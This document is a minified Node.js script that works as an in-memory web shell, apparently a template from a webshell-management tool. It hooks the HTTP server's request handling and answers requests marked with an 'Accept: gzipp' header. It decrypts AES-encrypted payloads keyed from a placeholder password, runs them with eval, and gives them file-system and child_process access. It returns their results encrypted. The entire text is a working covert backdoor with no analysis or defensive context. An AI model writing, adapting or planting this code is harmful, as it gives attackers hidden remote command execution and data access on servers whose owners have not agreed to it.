(async()=>{const fsMod=await import('fs');const pathMod=await import('path');const cryptoMod=await import('crypto');const zlibMod=await import('zlib');const cpMod=await import('child_process');const httpMod=await import('node:http');const urlMod=await import('node:url');const qsMod=await import('querystring');const fs=fsMod.default||fsMod;const path=pathMod.default||pathMod;const crypto=cryptoMod.default||cryptoMod;const zlib=zlibMod.default||zlibMod;const http=httpMod.default||httpMod;const url=urlMod.default||urlMod;const qs=qsMod.default||qsMod;const pass="{pass}";const key=crypto.createHash('md5').update(pass).digest();const iv=key.slice(0,16);const payloadStoreName='p_'+crypto.createHash('md5').update(pass).digest('hex').substring(0,8);function encrypt(data){try{const cipher=crypto.createCipheriv('aes-128-cbc',key,iv);let encrypted;if(Buffer.isBuffer(data)){encrypted=cipher.update(data);encrypted=Buffer.concat([encrypted,cipher.final()]);return encrypted.toString('base64');}else{encrypted=cipher.update(data,'utf8','base64');encrypted+=cipher.final('base64');return encrypted;}}catch(e){return null;}}function decrypt(encrypted){try{const decipher=crypto.createDecipheriv('aes-128-cbc',key,iv);let decrypted=decipher.update(encrypted,'base64');decrypted=Buffer.concat([decrypted,decipher.final()]);return decrypted;}catch(e){return null;}}const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event==='request'){const[req,res]=args;const acceptHeader=(req.headers['accept']||'').toLowerCase();if(acceptHeader.includes('gzipp')&&(req.method==='GET'||req.method==='POST')){let processData=async function(dataStr){try{const encrypted=dataStr||'';if(!encrypted||encrypted.length===0){if(!res.headersSent){res.writeHead(200,{'Content-Type':'application/json'});}res.end(JSON.stringify({status:'active',message:'API_ACTIVE'}));return;}const decrypted=decrypt(encrypted);if(!decrypted||decrypted.length===0){if(!res.headersSent){res.writeHead(200,{'Content-Type':'application/json'});}res.end(JSON.stringify({error:'DECRYPT_FAILED'}));return;}if(!global[payloadStoreName]){const payloadCode=decrypted.toString('utf8');if(payloadCode.includes('class Payload')){try{if(typeof global.require==='undefined'){const moduleCache={'fs':fs,'path':path,'zlib':zlib,'child_process':cpMod.default||cpMod,'os':await import('os').then(m=>m.default||m),'crypto':crypto};global.require=function(moduleName){if(moduleCache[moduleName]){return moduleCache[moduleName];}throw new Error('Cannot find module '+moduleName);};}const modifiedPayloadCode=payloadCode+'\nglobal.Payload=Payload;';(0,eval)(modifiedPayloadCode);const PayloadClass=global.Payload;if(!PayloadClass){throw new Error('Payload class not found in global after execution');}global[payloadStoreName]=PayloadClass;const okBuffer=Buffer.from('ok','utf8');const encryptedOk=encrypt(okBuffer);if(!res.headersSent){res.writeHead(200,{'Content-Type':'application/json'});}res.end(JSON.stringify({data:encryptedOk}));return;}catch(e){if(!res.headersSent){res.writeHead(500,{'Content-Type':'application/json'});}res.end(JSON.stringify({error:'Payload initialization failed: '+e.toString()}));return;}}else{if(!res.headersSent){res.writeHead(500,{'Content-Type':'application/json'});}res.end(JSON.stringify({error:'Payload not initialized. First request must contain payload code.'}));return;}}const Payload=global[payloadStoreName];const payloadInstance=new Payload();payloadInstance.formatParameter(decrypted);const result=await payloadInstance.run();let output=Buffer.alloc(0);if(Buffer.isBuffer(result)){output=result;}else{output=Buffer.from(JSON.stringify(result));}const gzippedOutput=zlib.gzipSync(output);const encryptedResult=encrypt(gzippedOutput);if(!res.headersSent){res.writeHead(200,{'Content-Type':'application/json'});}res.end(JSON.stringify({data:encryptedResult}));}catch(e){if(!res.headersSent){res.writeHead(500,{'Content-Type':'application/json'});}res.end(JSON.stringify({error:e?e.toString():'Unknown error'}));}};if(req.method==='POST'){let body='';req.on('data',chunk=>{body+=chunk.toString('utf8');});req.on('end',async()=>{try{let dataValue=null;try{const jsonBody=JSON.parse(body);dataValue=jsonBody.data;}catch(e){}if(!dataValue){const parsed=qs.parse(body);dataValue=parsed.data||parsed[pass];}if(!dataValue){if(!res.headersSent){res.writeHead(400,{'Content-Type':'application/json'});}res.end(JSON.stringify({error:'No data provided'}));return;}await processData(dataValue);}catch(e){if(!res.headersSent){res.writeHead(500,{'Content-Type':'application/json'});}res.end(JSON.stringify({error:e.message}));}});return true;}if(!res.headersSent){res.writeHead(200,{'Content-Type':'application/json'});}res.end(JSON.stringify({status:'registered',header:'Accept: gzipp'}));return true;}}return originalEmit.apply(this,arguments);};})();

